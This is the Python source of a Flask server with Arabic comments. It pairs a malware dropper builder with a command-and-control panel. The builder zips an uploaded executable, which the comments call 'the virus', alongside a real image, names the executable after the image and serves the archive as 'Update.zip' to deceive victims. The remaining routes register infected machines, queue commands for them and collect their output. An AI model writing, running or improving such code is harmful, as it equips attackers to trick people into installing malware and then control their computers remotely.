import os
import time
import uuid
import zipfile
import io
import threading
from flask import Flask, request, jsonify, send_file, send_from_directory

app = Flask(__name__)

# تخزين في الذاكرة
clients = {}
UPLOADED_PAYLOAD_DATA = None
PAYLOAD_EXTENSION = ".exe"
lock = threading.Lock()

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload_payload', methods=['POST'])
def upload_payload():
    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
    if 'file' not in request.files:
        return jsonify({"ok": False, "error": "No file"})
    file = request.files['file']
    if file.filename == '':
        return jsonify({"ok": False, "error": "Empty filename"})
    
    UPLOADED_PAYLOAD_DATA = file.read()
    PAYLOAD_EXTENSION = os.path.splitext(file.filename)[1]
    return jsonify({"ok": True})

@app.route('/build', methods=['POST'])
def build():
    global UPLOADED_PAYLOAD_DATA, PAYLOAD_EXTENSION
    if not UPLOADED_PAYLOAD_DATA:
        return "Please upload the payload first", 400
    
    if 'image' not in request.files:
        return "No image uploaded", 400
    
    img = request.files['image']
    img_name = img.filename
    
    custom_name = request.form.get('custom_name', '').strip()
    if not custom_name:
        custom_name = f"{img_name}{PAYLOAD_EXTENSION}"
    elif not custom_name.endswith(PAYLOAD_EXTENSION):
        custom_name += PAYLOAD_EXTENSION
    
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        # 1. الصورة الحقيقية
        zf.writestr(f"IMG_{img_name}", img.read())
        # 2. الفايروس بالاسم المخصص
        zf.writestr(custom_name, UPLOADED_PAYLOAD_DATA)
            
    memory_file.seek(0)
    return send_file(memory_file, mimetype='application/zip', as_attachment=True, download_name='Update.zip')

# --- مسارات التحكم ---
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    cid = data.get('id')
    with lock:
        clients[cid] = {"last_seen": time.strftime("%H:%M:%S"), "os": data.get('os', 'Unknown'), "cmd": "", "result": ""}
    return jsonify({"status": "ok"})

@app.route('/api/get_cmd/<cid>', methods=['GET'])
def get_cmd(cid):
    with lock:
        if cid in clients:
            clients[cid]['last_seen'] = time.strftime("%H:%M:%S")
            cmd = clients[cid]['cmd']
            clients[cid]['cmd'] = ""
            return jsonify({"cmd": cmd})
    return jsonify({"cmd": ""})

@app.route('/api/send_result/<cid>', methods=['POST'])
def send_result(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['result'] = data.get('result', '')
    return jsonify({"status": "ok"})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    with lock:
        return jsonify(clients)

@app.route('/api/send_cmd/<cid>', methods=['POST'])
def send_cmd(cid):
    data = request.json
    with lock:
        if cid in clients:
            clients[cid]['cmd'] = data.get('cmd')
            clients[cid]['result'] = ""
    return jsonify({"status": "ok"})

@app.route('/api/get_result/<cid>', methods=['GET'])
def get_result(cid):
    with lock:
        if cid in clients:
            return jsonify({"result": clients[cid]['result']})
    return jsonify({"result": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))